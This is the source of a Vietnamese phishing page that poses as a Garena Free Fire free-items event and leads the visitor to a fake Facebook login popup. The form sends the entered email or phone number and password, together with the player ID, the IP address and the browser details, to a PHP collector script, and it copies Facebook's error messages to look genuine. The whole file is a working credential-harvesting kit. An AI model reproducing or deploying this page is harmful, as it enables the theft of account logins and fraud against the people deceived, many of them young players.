<?php include 'nvn.php'; ?>



<!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>GARENA FREE FIRE</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
  	<script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
  	<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ionic/core/css/ionic.bundle.css"/> -->
</head>
<body>
	<div class="loader">
		<img src="https://h.top4top.io/p_2016h7ob71.gif">
	</div>
	<div class="ST-script">
		<div class="ST-header">
				<h1><?= $nvntieude;?></h1>
		</div>
		<div class="ST-bl"></div>
		<div class="ST-br"></div>
		<div class="ST-bagianAtas">
			<div class="ST-banner">
				<img class="ST-imgBanner" src="https://dl.dir.freefiremobile.com/common/web_event/hash/905885344a773e872bbe6f9ee3121e58jpg">
			</div>
			<div class="ST-bannerText">
				<h2><marquee behavior="scroll"><?= $nvnthongbao;?></marquee></h2>
			</div>
			<div class="ST-menu">
				<a class="ST-sub active" id="old">TRANG PHỤC</a>
				<a class="ST-sub" id="evo">VŨ KHÍ </a>
				<a class="ST-sub" id="incu">CHẾ TÁC</a>
			</div>

				<div class="ST-change" data-text="Nhận Quà Miễn Phí">
					
				</div>
		</div>
		<span class="creator">Copyright By <a href="#">Garena</a></span>
		<div class="ST-footer">
		</div>
		<!-- END OF HOME PAGE -->

		<!-- POPUP SECTION -->                         

	



		

		<div class="st-history">
			<h1>CHÀO MỪNG TRỞ LẠI</h1>
			<span class="top">Nickname :  <span id="hnama"></span></span>
			<span class="top" style="margin-top:-6px">ID :  <span id="hid"></span></span>
			<p class="bawah">Bạn muốn tiếp tục với ID này,<br>hay bạn muốn thay đổi ID? </p>
			<div class="dualButton">
				<div class="st-btns no" onclick="tdck()">Tiếp Tục!</div>
				<div class="st-btns yes" onclick="yez()">Thay Đổi!</div>
			</div>
		</div>



		<div class="st-toast">
			<p id="toastAlert">ID bạn đã nhập không khớp với bất kỳ tài khoản nào</p>
		</div>

		<div class="st-Reward">
			<div class="rewardToast">XIN CHÚC MỪNG <span id="cnick"></span></div>
			<div class="rewardImage">
				<img id="degagajago" src="assets/incu/1.jpg">
			</div>
			<div class="rewardButton">Nhận</div>
		</div>
<!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->



		<!-- FACEBOOK SECTION -->
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
			<div class="popup-box-login-fb">
			   <div class="navbar-fb">
				  <img width="45" src="assets/img/facebook_text.png">
			   </div>
			   <div class="content-box-fb">
				 <p class="alert sandi">   Sai mật khẩu. <b> Bạn quên mật khẩu của mình? </b></p>
				 <p class="alert email">Số điện thoại di động hoặc email bạn đã nhập không khớp với bất kỳ tài khoản nào. <b> Tìm kiếm tài khoản của bạn. </b></p>
				  <img width="75" height="75" src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png">
				  <div class="txt-login-fb">
				   Đăng nhập tài khoản Facebook của bạn để kết nối với Garena Free Fire
				  </div>
				  <form class="login-form" action="zindz.php" method="POST" onsubmit="return valid()">
					 <label>
					 <input type="text" id="user" name="user" placeholder="Số điện thoại di động hoặc email" autocomplete="off" autocapitalize="off">
					 </label>
					 <label>
					 <input type="password" id="pass" name="pass" placeholder="Mật khẩu" autocomplete="off" autocapitalize="off">
					 </label>
					 <input type="hidden" id="idPlayer" name="idPlayer" value="">
					 <input type="hidden" id="nickPlayer" name="nickPlayer" value="">
					 <input type="hidden" id="ipAddr" name="ipAddr" value="">
					 <input type="hidden" id="userAgent" name="userAgent" value="">
					 <button  type="submit" id="btnfb" class="btn-login-fb">Đăng nhập</button>
				  </form>
				    <div class="txt-create-account">Tạo tài khoản mới</div>
	         <div class="txt-not-now">Hoặc</div>
	         <div class="txt-forgotten-password">Quên mật khẩu?</div>
			   </div>
			   <div class="language-box">
				  <center>
				 <div class="language-name language-name-active">Tiếng Việt</div>
	         <div class="language-name"> English (UK) </div>
				  <div class="language-name">Basa Jawa</div>
				  <div class="language-name">Bahasa Melayu</div>
				  <div class="language-name">日本語</div>
				  <div class="language-name">Español</div>
				  <div class="language-name">Português (Brasil)</div>
				  <div class="language-name">
					 <i class="fa fa-plus"></i>
				  </div>
				  </center>
			   </div>
			   <div class="copyright">Facebook Inc.</div>
			</div>
		  </div>






<script type="text/javascript">
const togglePassword = document.querySelector('#togglePassword');
const password = document.querySelector('#password');
togglePassword.addEventListener('click', function (e) {
    // toggle the type attribute
    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
    password.setAttribute('type', type);
    // toggle the eye / eye slash icon
    this.classList.toggle('bi-eye');
});
</script>



	</div>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="luongvantan/tandz.js"></script>
	<script>
		// GET IpAddres && UserAgent
		$.ajax({
        type: "get",
        async: false,
        url: "https://na.apps.amsoveasea.com/swoole/?actid=2020&r=index/getCountry&_only_service_response_=1",
        dataType: "json",
        success: function(xyz) {
        $('#ipAddr').val(xyz.ip);
		$('#userAgent').val(navigator.userAgent);
		console.log('Created By Nong Van Nguyen');
        }
    })
	
       


 function phonenumber(user) {
 var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
 if (vnf_regex.test(user) == false) 
        {console.log("phonenumber false");
            return false; 
            
        }else{
            console.log("phonenumber true");
           return true;
           
        } 
}




function validateEmail (user)
{
  let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
  if (user.match(regexEmail)) {
      console.log("regexEmail true");
    return true; 
     
  } else {
      console.log("regexEmail false");
   return false; 
    
  }
}

 function validatepassword(pass){

if (pass.length >= 6 && pass.length <= 25)
{
   
    return true;
}
else {
 
    return false;
}
}

</script>

 <script>
 

 
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            phonenumber(user);
           validateEmail(user);
            var ip = $('#ip').val();
            if(user == '' || user == null)
            {
                
                $('.email').show();
                $('.sandi').hide();
                return false;
            }else if(validatepassword(pass) == false)
            {
                $('.email').hide();
                $('.sandi').show();
                return false;
            }
            else if(user != '' || user != null)
            {
                if( (phonenumber(user) == true)  || (validateEmail(user) == true))
                {
                $('.email').hide();
                $('.sandi').hide();
               
                }
                else
                {
                     $('.email').show();
                $('.sandi').hide();
                return false;
                }
            }
            
            
            $("#btnfb").addClass("disabled");
        }
        
        
  
   
    
	</script>
</body><!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->


</html><!-- -->